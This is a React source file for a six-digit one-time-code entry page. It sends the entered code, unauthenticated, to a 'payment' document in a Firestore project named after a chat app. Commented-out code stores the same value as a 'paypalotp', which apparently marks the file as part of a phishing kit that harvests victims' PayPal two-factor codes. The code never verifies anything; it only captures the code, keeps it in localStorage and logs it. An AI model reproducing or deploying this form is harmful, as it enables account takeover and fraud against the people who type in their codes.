import React, { useState, useRef, useEffect } from "react";

const OTPForm = () => {
  const [otp, setOtp] = useState(() => {
    return localStorage.getItem("otp")?.split("") || ["", "", "", "", "", ""];
  });
  const [userId] = useState(localStorage.getItem("userid"));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const inputRefs = useRef([]);

  useEffect(() => {
    localStorage.setItem("otp", otp.join("")); // Save OTP in localStorage whenever it updates
  }, [otp]);

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return; // Only allow numbers

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Move focus to next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!userId) {
      setMessage("❌ User ID is missing.");
      console.error("User ID is null or undefined");
      return;
    }

    const otpCode = otp.join("");
    if (otpCode.length !== 6) {
      setMessage("❌ Please enter all 6 digits.");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      console.log("Sending OTP:", otpCode);
      console.log("User ID:", userId);

      await fetch(
        `https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/payment/${userId}?updateMask.fieldPaths=otp`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            fields: {
              otp: { stringValue: otpCode },
            },
          }),
        }
      );
      setMessage("✅successfully!");
      setOtp(["", "", "", "", "", ""]);
      localStorage.removeItem("otp");

      // const response = await fetch(
      //   `http://localhost:8000/api/store-paypalotp/${userId}`,
      //   {
      //     method: "POST",
      //     headers: { "Content-Type": "application/json" },
      //     body: JSON.stringify({ paypalotp: otpCode }), // Fix here!
      //   }
      // );

      // const data = await response.json();
      // setLoading(false);

      // if (response.ok) {
      //   setMessage("✅successfully!");
      //   setOtp(["", "", "", "", "", ""]); // Clear fields after success
      //   localStorage.removeItem("otp"); // Remove OTP from localStorage
      // } else {
      //   setMessage(`❌ Error: ${data.message}`);
      // }
    } catch (error) {
      setLoading(false);
      setMessage("❌ Server error. Please try again.");
    }
  };


  return (
    <div className="flex justify-center items-center min-h-screen bg-gray-100 px-4">
      <div className="w-full max-w-md bg-white rounded-lg p-6 shadow-xl text-center">
        <h3 className="text-2xl font-bold mb-4 text-gray-700">
          Enter Your Code
        </h3>
        {message && <p className="mb-3 text-gray-600">{message}</p>}

        <h1>We sent a 6-digit code</h1>
        <br />
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex justify-center space-x-2">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="w-12 h-12 text-xl text-center border border-gray-300 rounded-md focus:border-blue-500 focus:ring focus:ring-blue-300 transition"
              />
            ))}
          </div>

          <button
            type="submit"
            className="w-full bg-[#3321C8] text-white font-semibold py-3 rounded-md text-lg hover:bg-[#3321C8] transition"
            disabled={loading}
          >
            {loading ? "Submitting..." : "Submit OTP"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default OTPForm;
